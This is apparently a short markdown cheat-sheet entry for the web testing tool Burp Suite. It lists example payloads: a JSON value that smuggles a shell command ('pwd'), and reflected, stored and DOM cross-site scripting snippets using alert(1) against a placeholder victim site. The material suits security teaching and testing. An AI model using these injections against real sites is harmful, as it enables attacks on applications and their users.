---
title: Burp Suite
desc: Security testing tool for web applications.
tags: [ActiveRecon, BrokenAccessControl, BruteForce, OAuth, Password, SQLi, SSRF, XSS]
alts: [OwaspZap]
website: https://portswigger.net/burp
---

## Json injection (HTTP POST request)

```json
{ "username": "\"; pwd \"" }
```

<br />

## XSS (Cross-site scripting)

### 1. Reflected XSS

```html
https://victim_site.com/item?id=<script>alert(1)</script>

<!-- ------------------------------------------------ -->

<p><script>alert(1)</script></p>
```

<br />

### 2. Stored XSS

```html
POST /post/comment HTTP/1.1
Host: victim_site.com
Content-Length: 52

id=2&message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

<!-- ---------------------------------------------------- -->

<p><script>alert(1)</script></p>
```

<br />

### 3. DOM XSS

```html
<img src=1 onerror='alert(1)' />

<!-- ---------------------------------------------------- -->

<p>
    Search result for <img src=1 onerror='alert(1)' />
</p>
```